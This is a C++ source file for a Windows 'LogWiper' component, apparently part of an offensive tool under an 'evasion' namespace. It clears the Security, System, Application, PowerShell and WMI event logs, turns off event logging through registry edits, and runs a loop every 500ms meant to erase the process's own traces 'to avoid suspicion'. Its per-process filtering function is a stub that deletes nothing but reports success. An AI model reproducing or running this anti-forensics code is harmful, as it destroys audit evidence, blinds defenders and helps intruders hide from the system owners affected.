#include "log_wiper.hpp"
#include <windows.h>
#include <vector>
#include <string>
#include <thread>
#include <chrono>

namespace l4g::evasion {

LogWiper::LogWiper() = default;

LogWiper::~LogWiper() {
    stop_monitoring();
}

void LogWiper::start_monitoring() {
    if (running_.exchange(true)) return;
    monitor_thread_ = std::thread(&LogWiper::monitor_loop, this);
}

void LogWiper::stop_monitoring() {
    if (!running_.exchange(false)) return;
    if (monitor_thread_.joinable()) monitor_thread_.join();
}

bool LogWiper::clear_log(const wchar_t* log_name) {
    HANDLE hLog = OpenEventLogW(nullptr, log_name);
    if (!hLog) return false;
    
    bool ok = ClearEventLogW(hLog, nullptr);
    CloseEventLog(hLog);
    return ok;
}

bool LogWiper::clear_log_entries(const wchar_t* log_name, DWORD /*pid*/) {
    HANDLE hLog = OpenEventLogW(nullptr, log_name);
    if (!hLog) return false;
    
    // Read and filter events - delete only those matching our PID
    // This is complex with EventLog API - simplified approach
    EVENTLOGRECORD* record = nullptr;
    DWORD read = 0, needed = 0;
    std::vector<uint8_t> buffer(65536);
    
    while (ReadEventLogW(hLog, EVENTLOG_FORWARDS_READ | EVENTLOG_SEQUENTIAL_READ, 0, buffer.data(), (DWORD)buffer.size(), &read, &needed)) {
        record = (EVENTLOGRECORD*)buffer.data();
        while (read > 0) {
            // Check if this event is from our process
            // EventLog doesn't directly store PID - would need to query event data
            record = (EVENTLOGRECORD*)((uint8_t*)record + record->Length);
            read -= record->Length;
        }
    }
    
    CloseEventLog(hLog);
    return true;
}

bool LogWiper::disable_logging(const wchar_t* log_name) {
    // Modify registry to disable logging
    HKEY hKey = nullptr;
    std::wstring path = L"SYSTEM\\CurrentControlSet\\Services\\EventLog\\" + std::wstring(log_name);
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        DWORD val = 0; // Disable
        RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

bool LogWiper::enable_logging(const wchar_t* log_name) {
    HKEY hKey = nullptr;
    std::wstring path = L"SYSTEM\\CurrentControlSet\\Services\\EventLog\\" + std::wstring(log_name);
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        DWORD val = 2; // Auto start
        RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

bool LogWiper::wipe_security_logs() {
    return clear_log(L"Security");
}

bool LogWiper::wipe_system_logs() {
    return clear_log(L"System");
}

bool LogWiper::wipe_application_logs() {
    return clear_log(L"Application");
}

bool LogWiper::wipe_powershell_logs() {
    bool ok = true;
    ok &= clear_log(L"Microsoft-Windows-PowerShell/Operational");
    ok &= clear_log(L"Microsoft-Windows-PowerShell/ScriptBlock");
    ok &= clear_log(L"Microsoft-Windows-PowerShell/Module");
    ok &= clear_log(L"Microsoft-Windows-PowerShell/Provider");
    return ok;
}

bool LogWiper::wipe_wmi_logs() {
    return clear_log(L"Microsoft-Windows-WMI/Operational");
}

bool LogWiper::wipe_all_logs() {
    bool ok = true;
    for (const auto* log : LOG_NAMES) {
        ok &= clear_log(log);
    }
    return ok;
}

bool LogWiper::wipe_pid_traces(DWORD pid) {
    bool ok = true;
    for (const auto* log : LOG_NAMES) {
        ok &= clear_log_entries(log, pid);
    }
    return ok;
}

void LogWiper::monitor_loop() {
    while (running_.load()) {
        // Check for new events every 500ms and clear them
        // Only clear our own traces to avoid suspicion
        wipe_pid_traces(GetCurrentProcessId());
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
}

} // namespace l4g::evasion